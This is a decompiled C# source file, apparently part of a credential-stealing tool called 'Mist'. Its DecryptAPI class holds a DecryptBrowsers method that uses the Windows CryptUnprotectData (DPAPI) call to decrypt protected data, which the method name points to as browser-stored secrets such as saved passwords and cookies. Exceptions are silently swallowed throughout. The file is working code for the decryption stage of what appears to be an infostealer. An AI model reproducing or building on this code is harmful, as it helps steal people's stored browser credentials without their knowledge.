using System;
using System.Runtime.InteropServices;

namespace Mist
{
	// Token: 0x0200000E RID: 14
	internal class DecryptAPI
	{
		// Token: 0x06000038 RID: 56 RVA: 0x00008580 File Offset: 0x00006780
		public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
		{
			DecryptAPI.DataBlob dataBlob = default(DecryptAPI.DataBlob);
			DecryptAPI.DataBlob dataBlob2 = default(DecryptAPI.DataBlob);
			DecryptAPI.DataBlob dataBlob3 = default(DecryptAPI.DataBlob);
			DecryptAPI.CryptprotectPromptstruct cryptprotectPromptstruct = new DecryptAPI.CryptprotectPromptstruct
			{
				cbSize = Marshal.SizeOf(typeof(DecryptAPI.CryptprotectPromptstruct)),
				dwPromptFlags = 0,
				hwndApp = IntPtr.Zero,
				szPrompt = null
			};
			string empty = string.Empty;
			try
			{
				try
				{
					if (cipherTextBytes == null)
					{
						cipherTextBytes = new byte[0];
					}
					dataBlob2.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
					dataBlob2.cbData = cipherTextBytes.Length;
					Marshal.Copy(cipherTextBytes, 0, dataBlob2.pbData, cipherTextBytes.Length);
				}
				catch
				{
				}
				try
				{
					if (entropyBytes == null)
					{
						entropyBytes = new byte[0];
					}
					dataBlob3.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
					dataBlob3.cbData = entropyBytes.Length;
					Marshal.Copy(entropyBytes, 0, dataBlob3.pbData, entropyBytes.Length);
				}
				catch
				{
				}
				DecryptAPI.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
				byte[] array = new byte[dataBlob.cbData];
				Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
				return array;
			}
			catch
			{
			}
			finally
			{
				if (dataBlob.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob.pbData);
				}
				if (dataBlob2.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob2.pbData);
				}
				if (dataBlob3.pbData != IntPtr.Zero)
				{
					Marshal.FreeHGlobal(dataBlob3.pbData);
				}
			}
			return new byte[0];
		}

		// Token: 0x06000039 RID: 57
		[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref DecryptAPI.DataBlob pCipherText, ref string pszDescription, ref DecryptAPI.DataBlob pEntropy, IntPtr pReserved, ref DecryptAPI.CryptprotectPromptstruct pPrompt, int dwFlags, ref DecryptAPI.DataBlob pPlainText);

		// Token: 0x0200000F RID: 15
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct DataBlob
		{
			// Token: 0x04000036 RID: 54
			public int cbData;

			// Token: 0x04000037 RID: 55
			public IntPtr pbData;
		}

		// Token: 0x02000010 RID: 16
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		private struct CryptprotectPromptstruct
		{
			// Token: 0x04000038 RID: 56
			public int cbSize;

			// Token: 0x04000039 RID: 57
			public int dwPromptFlags;

			// Token: 0x0400003A RID: 58
			public IntPtr hwndApp;

			// Token: 0x0400003B RID: 59
			public string szPrompt;
		}
	}
}
